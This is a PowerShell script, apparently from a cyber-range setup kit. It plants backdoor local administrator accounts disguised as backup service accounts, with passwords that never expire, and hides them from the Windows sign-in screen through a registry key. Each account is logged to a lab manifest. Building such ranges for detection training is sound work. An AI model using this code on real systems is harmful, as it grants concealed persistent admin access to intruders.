#requires -Version 5.1
<#  Category: Hidden local admin accounts

    Creates backup-looking local admins, adds them to Administrators, sets
    passwords to never expire, and hides them from the sign-in screen via the
    SpecialAccounts\UserList key.

    2025 note: the 2019 baseline used `wmic UserAccount ... set PasswordExpires`
    — WMIC is deprecated / may be absent on 2025. We use Set-LocalUser instead.
#>
param([hashtable]$Config)
$ErrorActionPreference = 'Continue'
if (-not $Config) {
    $d = $PSScriptRoot; while ($d -and -not (Test-Path (Join-Path $d 'modules\RangeCommon.psm1'))) { $d = Split-Path $d -Parent }
    Import-Module (Join-Path $d 'modules\RangeCommon.psm1') -Force
    $Config = Import-PowerShellDataFile (Join-Path $d 'config\range.config.psd1')
    Initialize-RangeContext; Assert-RangeSafety -Config $Config
}
$cat  = 'hidden-accounts'
$pass = ConvertTo-SecureString $Config.HiddenAdminPassword -AsPlainText -Force

foreach ($name in $Config.HiddenAdminAccounts) {
    try {
        if (Get-LocalUser -Name $name -ErrorAction SilentlyContinue) {
            Set-LocalUser -Name $name -Password $pass -PasswordNeverExpires $true
        } else {
            New-LocalUser -Name $name -Password $pass -PasswordNeverExpires -AccountNeverExpires `
                -Description "Backup Service Account" -ErrorAction Stop | Out-Null
        }
        if (-not (Get-LocalGroupMember -Group 'Administrators' -Member $name -ErrorAction SilentlyContinue)) {
            Add-LocalGroupMember -Group 'Administrators' -Member $name -ErrorAction SilentlyContinue
        }
        # Hide from the sign-in screen
        Set-RegValue 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' $name DWord 0 $cat
        Write-RangeManifest $cat 'hidden-admin' $name
        Write-RangeLog "Created/updated hidden admin: $name" 'WARN'
    } catch { Write-RangeLog "account $name failed: $($_.Exception.Message)" 'WARN' }
}

Write-RangeLog 'Hidden-accounts category complete.' 'OK'
